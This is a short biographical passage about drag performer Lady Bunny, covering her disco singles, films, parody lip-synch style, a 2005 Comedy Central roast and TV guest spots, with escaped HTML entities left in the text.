She has also released disco singles such as \u0026quot;Shame, Shame, Shame!\u0026quot; and \u0026quot;The Pussycat Song.\u0026quot; She has appeared in films such as Wigstock: The Movie, Peoria Babylon, and To Wong Foo, Thanks for Everything!

She appeared in a variety of low budget films with them.\u003Cbr\/\u003E\u003Cbr\/\u003EHer blog is her own take on current affairs and cultural issues. Her style of drag performance usually involves lip-synching to a compilation of karaoke versions of popular songs over which she has recorded her own vocals singing parodies of the original lyrics. The new lyrics are usually sexually explicit, or revolve around food, or both. For instance, her parody of the Gwen Stefani song Hollaback Girl has the lyric \u0026quot;I shit a banana\/a banana in my ass!\u0026quot;\u003Cbr\/\u003E\u003Cbr\/\u003EIn 2005 she was a roaster on the Comedy Central roast of Pamela Anderson and released her first DVD, Rated X for X-tra Retarded.\u003Cbr\/\u003E\u003Cbr\/\u003ELady Bunny made special guest appearances on the House of Venus Show, a queer sketch comedy television series on OUTtv and Pink TV, and on the pilot episode of Laugh Out, the interactive, gay-themed comedy show.
